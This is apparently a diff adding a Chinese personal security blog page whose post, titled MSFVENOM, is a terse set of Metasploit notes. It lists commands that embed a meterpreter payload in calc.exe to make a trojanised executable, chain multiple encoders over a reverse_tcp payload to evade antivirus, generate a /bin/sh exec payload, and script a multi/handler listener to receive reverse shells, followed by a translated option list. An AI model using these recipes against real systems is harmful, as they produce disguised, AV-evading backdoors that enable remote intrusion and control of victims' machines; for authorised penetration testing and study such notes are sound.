@@ -1,0 +1,237 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>MSFVENOM | XEI7 乱M集</title>
+  <meta name="author" content="XEI7">
+  
+  <meta name="description" content="/usr/share/metasploit-framework/toolscat payload_file.bin | ./msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f rawmsfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &amp;gt; new.exePAYLOAD windows/meterpreter/reverse_tcp$MSFVENOM -p “$PAYLOAD” LHOST=”$IP” LPORT=”$PORT” EXITFUNC=thread -f raw |$MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2&amp;gt;/dev/null |$MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 –platform linux -f raw 2&amp;gt;/dev/null |$MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 –platform win -f raw 2&amp;gt;/dev/null |$MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 –platform win -f c &amp;gt; msf.c 2&amp;gt;/dev/null
+ github/metasploitavevasion">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="MSFVENOM"/>
+  <meta property="og:site_name" content="XEI7 乱M集"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/imgs/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="XEI7 乱M集" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+  <header><div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/imgs/logo.png" alt="XEI7 乱M集" title="XEI7 乱M集"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name">XEI7 乱M集</h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/urls">_</a></li>
+					
+
+				</ul>
+			</nav>			
+</div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+	MSFVENOM
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://xei7.github.io" title="XEI7">XEI7</a>
+    </p>
+  <p class="article-time">
+    <time datetime="1912-12-01T00:00:00.000Z" itemprop="datePublished">1912-12-01</time>
+    更新日期:<time datetime="2015-12-10T01:57:12.158Z" itemprop="dateModified">2015-12-10</time>
+    
+  </p>
+</header>
+    <div class="entry">
+		
+        <p>/usr/share/metasploit-framework/tools<br>cat payload_file.bin | ./msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw<br>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe<br>PAYLOAD windows/meterpreter/reverse_tcp<br>$MSFVENOM -p “$PAYLOAD” LHOST=”$IP” LPORT=”$PORT” EXITFUNC=thread -f raw |<br>$MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 –platform linux -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 –platform win -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 –platform win -f c &gt; msf.c 2&gt;/dev/null</p>
+<p> github/metasploitavevasion<br><a id="more"></a><br>msfconsole<br>show payload<br>use linux/x64/exec<br>set cmd /bin/sh<br>generate -t py -b “/x00”</p>
+<pre><code>echo &quot;&quot;
+echo &apos;use exploit/multi/handler&apos; &gt;&gt; msfhandler.rc
+echo &quot;set payload $PAYLOAD&quot; &gt;&gt; msfhandler.rc
+echo &quot;set LHOST $IP&quot; &gt;&gt; msfhandler.rc
+echo &quot;set LPORT $PORT&quot; &gt;&gt; msfhandler.rc                                               
+echo &apos;exploit&apos; &gt;&gt; msfhandler.rc
+$MSFCONSOLE -r msfhandler.rc
+</code></pre><p>Options:<br>    -p, –payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定<br>    -l, –list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all<br>    -n, –nopsled    <length>        为payload预先指定一个NOP滑动长度<br>    -f, –format     <format>        指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)<br>    -e, –encoder    [encoder]       指定需要使用的encoder（编码器）<br>    -a, –arch       <architecture>  指定payload的目标架构<br>        –platform   <platform>      指定payload的目标平台<br>    -s, –space      <length>        设定有效攻击荷载的最大长度<br>    -b, –bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;<br>    -i, –iterations <count>         指定payload的编码次数<br>    -c, –add-code   <path></path>          指定一个附加的win32 shellcode文件<br>    -x, –template   <path></path>          指定一个自定义的可执行文件作为模板<br>    -k, –keep                       保护模板程序的动作，注入的payload作为一个新的进程运行<br>        –payload-options            列举payload的标准选项<br>    -o, –out   <path></path>               保存payload<br>    -v, –var-name <name>            指定一个自定义的变量，以确定输出格式<br>        –shellest                   最小化生成payload<br>    -h, –help                       查看帮助选项<br>        –help-formats               查看msf支持的输出格式列表</name></count></list></length></platform></architecture></format></length></payload></p>
+<p>/usr/share/metasploit-framework/data/templates</p>
+
+    </div>
+    <footer>
+        
+  
+  <div class="categories">
+    <a href="/categories/kali/">kali</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>
+  </div>
+ 
+        <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+ <nav id="pagination" >
+    
+    <a href="/2015/01/03/sqlmap学习/" class="alignleft prev" title="sqlmap学习">sqlmap学习</a>
+    
+    
+    <a href="/1912/12/01/bash常用技巧/" class="alignright next" title="bash常用技巧">bash常用技巧</a>
+    
+    <div class="clearfix"></div>
+</nav>
+
+
+
+	
+	<section id="comment">
+		<!-- 多说评论框 start -->
+		<div class="ds-thread" data-thread-key="1912/12/01/MSFVENOM/" data-title="MSFVENOM" data-url="https://xei7.github.io/1912/12/01/MSFVENOM/"></div>
+		<!-- 多说评论框 end -->
+		<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+		<script type="text/javascript">
+		var duoshuoQuery = {short_name:"xei7"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0] 
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+		</script>
+		<!-- 多说公共JS代码 end -->
+	</section>
+	
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
+  
+    <li><a href="/categories/kali/">kali</a><small>3</small></li>
+  
+    <li><a href="/categories/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/categories/python/">python</a><small>1</small></li>
+  
+    <li><a href="/categories/sdr/">sdr</a><small>1</small></li>
+  
+    <li><a href="/categories/sqlmap/">sqlmap</a><small>3</small></li>
+  
+    <li><a href="/categories/web/">web</a><small>7</small></li>
+  
+    <li><a href="/categories/中医/">中医</a><small>4</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/categories/网络/">网络</a><small>1</small></li>
+  
+    <li><a href="/categories/逆向/">逆向</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://blog.sina.com.cn/3838120958 " title=" Blog" target="_blank">_</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<!--script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"-->
+</script>
+</body>
+</html>
+
+
